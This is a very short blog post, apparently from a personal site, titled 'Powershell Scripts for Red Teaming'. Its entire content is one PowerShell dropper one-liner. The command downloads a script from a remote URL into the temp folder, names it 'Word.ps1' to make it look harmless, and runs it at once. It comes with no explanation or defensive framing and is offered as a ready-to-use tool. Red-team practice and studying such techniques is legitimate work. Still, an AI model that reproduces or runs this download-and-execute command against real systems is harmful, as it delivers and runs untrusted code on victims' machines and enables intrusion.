---
layout: post
title:  "Powershell Scripts for Red Teaming"
date:   2025-06-16 21:00:00 +1000
categories: scripts
---

## Red teaming powershell scripts. Droppers and more.

---

### Invoke-WebRequest dropper

``` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" ```


